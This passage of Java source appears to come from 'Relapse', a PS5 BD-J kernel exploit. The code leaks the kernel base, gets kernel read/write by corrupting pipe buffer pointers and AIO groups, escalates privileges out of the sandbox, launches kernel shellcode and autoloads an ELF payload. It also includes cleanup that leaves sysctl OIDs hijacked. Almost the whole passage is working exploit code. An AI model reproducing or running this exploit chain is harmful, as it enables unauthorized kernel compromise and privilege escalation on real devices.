 * app budget then tears the system down on close. */
private static void cleanupAfterLaunch() {
    try {
        restoreThreadAttributes();

        if (armedGroupsLen != 0 && !defused) {
            Status.println("Post-launch cleanup: repairing aio groups");
            if (curproc == 0) findCurrentProcess();
            if (curproc != 0) defuseAioGroups();
            else Status.println("Post-launch cleanup: current process unavailable");
        }

        restorePipes();     /* slow window; restores shell + primitive pipes */
        Status.println("Post-launch cleanup: sysctl OIDs left hijacked until reboot");
        releaseAioWorkers();
        closeScratchDescriptors();
    } catch (Throwable t) {
        Status.printStackTrace("Post-launch cleanup failed: ", t);
    }
}

/* ===================================================================== */
/* launch shellcode                                                      */
/* ===================================================================== */

private static RelapsePipe makeShellcodePipe(String label) {
    long fdp = procFdAddr;
    if (fdp == 0) {
        fdp = readKernelPointerSlow(curproc + off.procFd);
    }
    if (fdp == 0) {
        throw new RuntimeException("shellcode " + label + " file table is invalid");
    }

    Int32Array fds = new Int32Array(2);
    if (pipe2(fds, O_NONBLOCK) != 0) {
        throw new RuntimeException("could not create the shellcode " + label + " pipe");
    }
    int readFd = fds.get(0);
    int writeFd = fds.get(1);
    if (readFd <= 0 || writeFd <= 0 || readFd >= 0x100000 || writeFd >= 0x100000) {
        throw new RuntimeException("shellcode " + label + " pipe returned invalid fds "
            + readFd + "/" + writeFd);
    }

    /* Not tracked by closeScratchDescriptors: after crossShellcodePipes() the
     * master's pipe_buffer.buffer aliases the victim pipe struct, so a plain
     * close would free a uma object through the malloc path.  The pipe's own
     * buffer/size are recorded here and written back by restorePipes() before
     * exit so the eventual close is a normal pipe teardown. */
    PipeInfo info = findPipe(fdp, readFd, "shellcode " + label);
    if (info == null || !info.isReadEnd) {
        throw new RuntimeException("shellcode " + label + " pipe self-check failed");
    }

    long originalBuffer = readKernelPointerSlow(info.pipe + off.pipeBuffer);
    SysctlResult originalSize = kread32Slow(info.pipe + off.pipeSize);
    if (originalBuffer == 0 || originalSize.rv != 0 || originalSize.value == 0) {
        throw new RuntimeException("shellcode " + label + " pipe buffer could not be recorded");
    }

    /*
     * Deliberately leave the fresh pipe untouched (count/in/out all zero),
     * matching kexp.js prepareShellcodePipes(). kexp resets the pipe head
     * through the crossed master end before its first use.
     */
    RelapsePipe pipe = new RelapsePipe(info.pipe, readFd, writeFd, true);
    pipe.originalBuffer = originalBuffer;
    pipe.originalSize = originalSize.value;
    return pipe;
}

/* Cross the fresh shellcode pipes exactly like kexp.js prepareShellcodePipes. */
private static void crossShellcodePipes(RelapsePipe shellMaster, RelapsePipe shellVictim) {
    int size = off.pipeDefaultSize;

    if (!writeKernel32Fast(shellMaster.pipe + off.pipeCount, 0) ||
        !writeKernel32Fast(shellMaster.pipe + off.pipeIn, 0) ||
        !writeKernel32Fast(shellMaster.pipe + off.pipeOut, 0) ||
        !writeKernel32Fast(shellMaster.pipe + off.pipeSize, size) ||
        !writeKernel64Fast(shellMaster.pipe + off.pipeBuffer, shellVictim.pipe)) {
        throw new RuntimeException("shellcode pipe bootstrap failed");
    }

    long readBack = readKernel64Fast(shellMaster.pipe + off.pipeBuffer);
    if (readBack != shellVictim.pipe) {
        throw new RuntimeException("shellcode pipe bootstrap read-back failed");
    }
}

private static boolean launchShellcode() {
    try {
        if (DIAGNOSTIC_STOP_BEFORE_KEXP) {
            Status.println("diagnostic: stopping before kexp");
            return true;
        }

        restoreThreadAttributes();
        long allprocAddr = kbase + off.allproc;

        Status.println("Launch: creating shell pipes");
        shellMaster = makeShellcodePipe("master");
        shellVictim = makeShellcodePipe("victim");
        Status.println("Launch: crossing shell pipes");
        crossShellcodePipes(shellMaster, shellVictim);
        Status.println("Launch: starting kexp");

        return AioShellcode.start(allprocAddr,
            shellMaster.readFd, shellMaster.writeFd,
            shellVictim.readFd, shellVictim.writeFd);
    } catch (Throwable t) {
        Status.printStackTrace("launchShellcode failed: ", t);
        return false;
    }
}

/* ===================================================================== */
/* main                                                                  */
/* ===================================================================== */

public static void main(String[] args) {
    /* Keep the UDP logger enabled: it caches messages until log_client.py
     * registers, so the trace survives an app crash. */
    Status.setScreenOutputEnabled(true);
    Status.setNetworkLoggerEnabled(true);
    Status.println(VERSION_STRING + " starting (logger ready)");

    NativeInvoke.sendNotificationRequest(VERSION_STRING);

    if (PLATFORM == null || !PLATFORM.equals("PS5")) {
        Status.println("not a PS5 BD-J context");
        NativeInvoke.sendNotificationRequest("Relapse: not a PS5 BD-J context");
        return;
    }

    if (off == null) {
        Status.println("unsupported firmware: " + FW_VERSION);
        NativeInvoke.sendNotificationRequest("Relapse: unsupported firmware " + FW_VERSION);
        return;
    }

    NativeInvoke.sendNotificationRequest("PLATFORM : " + PLATFORM + "\nFW_VERSION : " + FW_VERSION);
    Status.println("PLATFORM=" + PLATFORM + " FW_VERSION=" + FW_VERSION);

    boolean launched = false;
    try {
        leakKernelBase();
        Status.println("leakKernelBase finished");

        pinToSingleCore();

        if (!armKernelReadWrite()) {
            Status.println("armKernelReadWrite failed");
            return;
        }
        Status.println("kernel R/W ready (slow)");

        if (!findCurrentProcess()) {
            Status.println("findCurrentProcess failed");
            return;
        }

        if (!locatePipes()) {
            Status.println("locatePipes failed");
            return;
        }

        if (!crossPipes()) {
            Status.println("crossPipes failed");
            return;
        }
        Status.println("fast read and write ready");

        defuseAioGroups();

        if (!escalate()) {
            Status.println("escalate failed");
            return;
        }
        Status.println("privileges ready (uid=" + getuid() + " sandbox=" + isInSandbox() + ")");

        launched = launchShellcode();
        Status.println(launched ? "payloads loaded" : "finished");
    } catch (Throwable t) {
        Status.printStackTrace("Relapse fatal: ", t);
        NativeInvoke.sendNotificationRequest("Relapse fatal: " + t.getMessage());
    } finally {
        /* Poops does not tear down the kernel-side pipe state after kexp has
         * run either.  Restoring the crossed pipes while the loader is alive
         * can free a pipe structure through the buffer pointer and take the
         * app down.  Only clean up on failure paths. */
        if (launched) {
            Status.println("post-launch cleanup: restoring pipes, OIDs left hijacked");
            cleanupAfterLaunch();
            Status.println("Relapse main returning");
        } else {
            cleanup();
        }
    }

    /* Pipes are repaired at this point, so it is safe to hand an ELF to
     * elfldr and (optionally) end this process. */
    if (launched) {
        Autoloader.run();
    }
}

/* ===================================================================== */
/* helper classes                                                        */
/* ===================================================================== */

static class SysctlResult {
    final int rv;
    final int len;
    final int value;
    final long longValue;
    SysctlResult(int rv, int len) { this.rv = rv; this.len = len; this.value = 0; this.longValue = 0; }
    SysctlResult(int rv, int low, long high) { this.rv = rv; this.len = 0; this.value = low; this.longValue = (high & 0xFFFFFFFF00000000L) | (low & 0xFFFFFFFFL); }
}

static class RelapseSocketPair {
    int readFd;
    int writeFd;
    RelapseSocketPair(int readFd, int writeFd) {
        this.readFd = readFd;
        this.writeFd = writeFd;
    }
}

static class RelapsePipe {
    long pipe;
    int readFd;
    int writeFd;
    boolean isReadEnd;
    /* The pipe's own buffer and size, captured before the crossing overwrites
     * them.  Teardown writes them back so pipe_dtor() frees a real allocation
     * instead of the peer's struct. */
    long originalBuffer;
    int originalSize;
    RelapsePipe(long pipe, int readFd, int writeFd, boolean isReadEnd) {
        this.pipe = pipe;
        this.readFd = readFd;
        this.writeFd = writeFd;
        this.isReadEnd = isReadEnd;
    }
}

static class PipeInfo {
    long pipe;
    boolean isReadEnd;
    PipeInfo(long pipe, boolean isReadEnd) {
        this.pipe = pipe;
        this.isReadEnd = isReadEnd;
    }
}

static class AioGroup {
    long ids;
    int count;
}

static class ReclaimResult {
    AioGroup group;
    int firstPending;
    int heads;
}

/* ===================================================================== */
/* cleanup helpers                                                       */
/* ===================================================================== */

private static void rememberArmedGroup(AioGroup group) {
    if (armedGroupsLen >= armedGroupCounts.length) return;
    int start = 0;
    for (int i = 0; i < armedGroupsLen; i++) start += armedGroupCounts[i];
    for (int i = 0; i < group.count; i++) {
        armedGroupIds[start + i] = readU32(group.ids, i * 4);
    }
    armedGroupCounts[armedGroupsLen] = group.count;
    armedGroupsLen++;
}

private static void sleep(int ms) {
    try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
}
}